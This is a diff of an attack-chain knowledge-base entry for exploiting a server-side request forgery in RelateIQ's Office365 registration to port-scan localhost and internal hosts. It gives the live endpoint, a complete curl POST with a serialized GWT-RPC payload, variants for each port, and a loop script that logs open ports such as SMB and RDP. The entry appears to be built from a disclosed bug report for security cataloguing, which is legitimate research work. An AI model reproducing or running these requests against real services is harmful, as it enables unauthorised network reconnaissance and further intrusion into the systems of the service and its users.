@@ -3,8 +3,9 @@ id: ac-relateiq-ssrf-portscan-16571
 tags:
   - ssrf
   - port-scanning
-  - web
   - gwt
+  - java
+  - registration-bypass
 type: attack_chain
 tools:
   - '[[tools/nmap]]'
@@ -18,16 +19,18 @@ submitted: true
 complexity: medium
 created_at: '2023-10-01T00:00:00Z'
 procedures:
-  - '[[procedures/Exploit-SSRF-in-RelateIQ-Registration-for-Port-Scanning]]'
-step_count: 5
+  - '[[procedures/Identify-Custom-Server-Option-in-Registration]]'
+  - '[[procedures/Craft-GWT-RPC-Request-for-SSRF-Test]]'
+  - '[[procedures/Perform-Port-Scanning-via-SSRF]]'
+  - '[[procedures/Analyze-Responses-for-Open-Ports]]'
+step_count: 4
 techniques:
   - '[[Exploit Public-Facing Application]]'
   - '[[Active Scanning]]'
-updated_at: '2025-12-14T04:39:02.215Z'
+updated_at: '2025-12-14T17:28:20.616Z'
 description: >-
-  Multi-stage attack exploiting SSRF in RelateIQ's registration process to
-  perform port scanning on internal and external systems from the server's
-  infrastructure.
+  Exploits SSRF in RelateIQ's Office365 registration to perform port scanning on
+  internal and external systems from the server side.
 skill_level: intermediate
 impact_level: high
 validated: true
@@ -40,14 +43,14 @@ mitre_techniques:
 ---
 # SSRF Port Scanning via RelateIQ Registration Custom Server Option
 
-Multi-stage attack chain demonstrating exploitation of a Server-Side Request Forgery (SSRF) vulnerability in RelateIQ's user registration process. By selecting the custom server option, attackers can trigger the validateOffice365Account RPC method to make arbitrary requests to internal and external hosts, enabling port scanning of the target's infrastructure. This reveals open ports on localhost (e.g., 80, 135, 445, 3389, 49152, 49154), exposing internal network details without direct access.
+Multi-stage attack chain demonstrating exploitation of SSRF in RelateIQ's registration process to scan ports on localhost and other systems.
 
 ## Chain Metrics Dashboard
 
 | Metric | Value |
 |--------|-------|
 | Chain Status | Unverified |
-| Total Steps | 5 |
+| Total Steps | 4 |
 | Execution Time | ~10 minutes |
 | Skill Level | Intermediate |
 | Complexity | Medium |
@@ -57,16 +60,14 @@ Multi-stage attack chain demonstrating exploitation of a Server-Side Request For
 
 ```mermaid
 graph LR
-    A[Access Registration] --> B[Craft SSRF Request]
-    B --> C[Scan Ports via URL Modification]
-    C --> D[Analyze Responses]
-    D --> E[Reference Nmap for Comprehensive Scan]
+    A[Identify Custom Server Option] --> B[Craft GWT RPC Request]
+    B --> C[Modify for Port Scanning]
+    C --> D[Analyze Open Ports]
 
     style A fill:#e74c3c
     style B fill:#f39c12
-    style C fill:#f39c12
-    style D fill:#3498db
-    style E fill:#27ae60
+    style C fill:#3498db
+    style D fill:#27ae60
 ```
 
 ## Prerequisites & Requirements
@@ -74,40 +75,43 @@ graph LR
 ### Required Tools
 
 - [[tools/nmap]]
-- Browser or HTTP client (e.g., curl)
+- Web browser or proxy tool like Burp Suite for crafting requests
 
 ### Target Environment
 
-- RelateIQ application at app.relateiq.com
-- Web platform with GWT RPC endpoint (/app/GWT.rpc)
-- No authentication required for registration page
+- RelateIQ application (web-based CRM)
+- Required services/ports: HTTP/HTTPS on target ports (e.g., 80, 443)
+- Network access requirements: Public access to RelateIQ registration endpoint
 
 ### Initial Access Requirements
 
-- Public internet access to app.relateiq.com
-- No prior credentials needed; exploits public-facing registration
+- No credentials needed; exploits public registration feature
+- Network position: External attacker
+- Prior access needed: None
 
 ## Detailed Attack Procedures
 
-### Step 1: Access Registration Page and Select Custom Server
-procedure: [[procedures/Exploit-SSRF-in-RelateIQ-Registration-for-Port-Scanning]]
+### Step 1: Identify Custom Server Option
+procedure: [[procedures/Identify-Custom-Server-Option-in-Registration]]
 
-**Objective**: Initiate the registration process to reach the custom server configuration, which triggers the vulnerable validateOffice365Account method.
+**Objective**: Locate the custom server URL parameter in the registration process that triggers the vulnerable validateOffice365Account function.
 
-**Instructions**: Navigate to the RelateIQ registration page at https://app.relateiq.com and select the custom server option during signup. This prepares the environment for SSRF exploitation without completing full registration.
+**Instructions**: During registration, inspect the form for Office365 integration options. The custom server field allows input of arbitrary URLs, which are passed without validation to the backend RPC method.
 
-**Expected Output**: Custom server input fields appear, allowing URL specification for Office365 validation.
+**Expected Output**: Confirmation of the custom server input field in the registration UI or via inspecting network requests.
 
 **Success Indicators**:
-- Custom server option selected
-- validateOffice365Account method is invoked on URL submission
+- Custom server option visible in registration form
+- RPC endpoint /app/GWT.rpc identified
 
-### Step 2: Send Crafted POST Request to GWT RPC Endpoint
-procedure: [[procedures/Exploit-SSRF-in-RelateIQ-Registration-for-Port-Scanning]]
+### Step 2: Craft GWT RPC Request for SSRF Test
+procedure: [[procedures/Craft-GWT-RPC-Request-for-SSRF-Test]]
 
-**Objective**: Exploit SSRF by sending a POST request with an arbitrary URL (e.g., localhost port) to force the server to connect to attacker-specified hosts.
+**Objective**: Send an initial POST request to the GWT RPC endpoint using a localhost URL to test SSRF.
 
-**Instructions**: Use [[commands/relateiq-ssrf-post]] to send the GWT-serialized RPC request targeting https://127.0.0.1:1:
+**Instructions**: Use a tool like curl or Burp Suite to send a POST to https://app.relateiq.com/app/GWT.rpc with the specified payload targeting https://127.0.0.1:1. Include necessary headers like Content-Type: text/x-gwt-rpc; charset=utf-8.
+
+Execute [[commands/gwt-rpc-ssrf-test]]:
 
 ```bash
 curl -X POST https://app.relateiq.com/app/GWT.rpc \
@@ -117,58 +121,65 @@ curl -X POST https://app.relateiq.com/app/GWT.rpc \
   -d '7|2|10|https://app.relateiq.com/app/|11E595F5F188A97EA5C0F616EDA48ACD|com.google.gwt.user.client.rpc.XsrfToken/4254043109|18E2A3D3C932C5D49E0CF355C34327E4|com.relateiq.web.client.UtilityService|validateOffice365Account|java.lang.String/2004016611|123@123.com|123|https://127.0.0.1:1|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
 ```
 
-**Expected Output**: Server response indicating connection attempt, such as HTTP 504 for open ports.
+**Expected Output**: Response indicating connection attempt, such as 'Unable to connect to the remote server' for closed ports.
 
 **Success Indicators**:
-- Request accepted without validation errors
-- Server makes outbound request to specified URL
+- Server processes the arbitrary URL
+- Response differentiates based on connectivity
 
-### Step 3: Modify URL to Target Different IPs and Ports
-procedure: [[procedures/Exploit-SSRF-in-RelateIQ-Registration-for-Port-Scanning]]
+### Step 3: Perform Port Scanning via SSRF
+procedure: [[procedures/Perform-Port-Scanning-via-SSRF]]
 
-**Objective**: Iterate over target IPs and ports to perform systematic scanning of internal/external systems.
+**Objective**: Iterate over target ports by modifying the URL in the RPC payload to probe for open ports on localhost or other IPs.
 
-**Instructions**: Update the URL parameter in [[commands/relateiq-ssrf-post]] (e.g., change to https://127.0.0.1:80, https://internal-ip:445) and resend requests for various TCP ports.
+**Instructions**: Reference common ports from [[tools/nmap]] (top 50 ports). Replace the URL parameter (e.g., https://127.0.0.1:1) with variations like https://127.0.0.1:80, https://127.0.0.1:135, etc. Send repeated requests and note response differences.
 
-**Expected Output**: Varied responses based on port status (e.g., timeout for open, connection error for closed).
+Use a script or manual iteration with [[commands/gwt-rpc-ssrf-test]] modified for each port:
+
+```bash
+# Example for port 80
+curl -X POST https://app.relateiq.com/app/GWT.rpc \
+  -H "Content-Type: text/x-gwt-rpc; charset=utf-8" \
+  -d '7|2|10|https://app.relateiq.com/app/|...|https://127.0.0.1:80|...'
+```
+
+**Expected Output**: Open ports yield HTTP 504 or connection errors; closed ports yield 'Unable to connect'.
 
 **Success Indicators**:
-- Multiple ports tested successfully
-- Differences in response times/patterns observed
+- Varied responses based on port status
+- Ability to target internal/external IPs
 
-### Step 4: Analyze HTTP Responses for Open Ports
-procedure: [[procedures/Exploit-SSRF-in-RelateIQ-Registration-for-Port-Scanning]]
+### Step 4: Analyze Responses for Open Ports
+procedure: [[procedures/Analyze-Responses-for-Open-Ports]]
 
-**Objective**: Interpret server responses to distinguish open from closed ports, mapping the network topology.
+**Objective**: Document open ports discovered through response analysis, enabling further reconnaissance.
 
-**Instructions**: Review responses from previous requests: Open ports yield HTTP 504 Gateway Timeout or 'The underlying connection was closed'; closed ports show 'Unable to connect to the remote server'. Log results for ports like 80 (HTTP), 135 (RPC), 445 (SMB), 3389 (RDP), 49152-49154 (dynamic).
+**Instructions**: Collect responses from port scans and identify patterns. For localhost, expect open ports like 80 (HTTP), 135 (RPC), 445 (SMB), 3389 (RDP), and dynamic ports 49152, 49154.
+
+Log results manually or via script:
+
+```bash
+# Pseudo-script to log
+for port in 80 135 445 3389 49152 49154; do
+  # Send request and grep response
+  curl ... | grep -i "connect" || echo "Open: $port"
+ done
+```
 
 **Expected Output**: List of open ports: 80, 135, 445, 3389, 49152, 49154.
 
 **Success Indicators**:
-- Open ports identified via error patterns
-- Internal services exposed (e.g., RDP on 3389)
-
-### Step 5: Reference Nmap Top 50 Ports for Comprehensive Testing
-procedure: [[procedures/Exploit-SSRF-in-RelateIQ-Registration-for-Port-Scanning]]
-
-**Objective**: Use nmap's top 50 ports as a reference to guide SSRF-based scanning, ensuring coverage of common services.
-
-**Instructions**: Consult [[tools/nmap]] top 50 list locally to select ports, then apply them in Step 3's URL modifications. For example, test ports 22, 80, 443, etc., via SSRF requests.
-
-**Expected Output**: Confirmed open ports matching nmap reference: 80, 135, 445, 3389, 49152, 49154.
-
-**Success Indicators**:
-- Scan aligns with nmap's common ports
-- Additional internal details revealed
+- Open ports identified on internal systems
+- Potential for private network reconnaissance
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Exploited SSRF in public registration to bypass URL validation
-2. Performed blind port scanning from server-side infrastructure
-3. Exposed internal ports (e.g., RDP, SMB) revealing network topology
+1. Exploited SSRF without authentication via public registration
+2. Performed server-side port scanning on localhost and beyond
+3. Revealed internal services like HTTP, SMB, RDP for further attacks
+4. Demonstrated reconnaissance impact on private networks
 
 ## Technique & Tactic Coverage
 
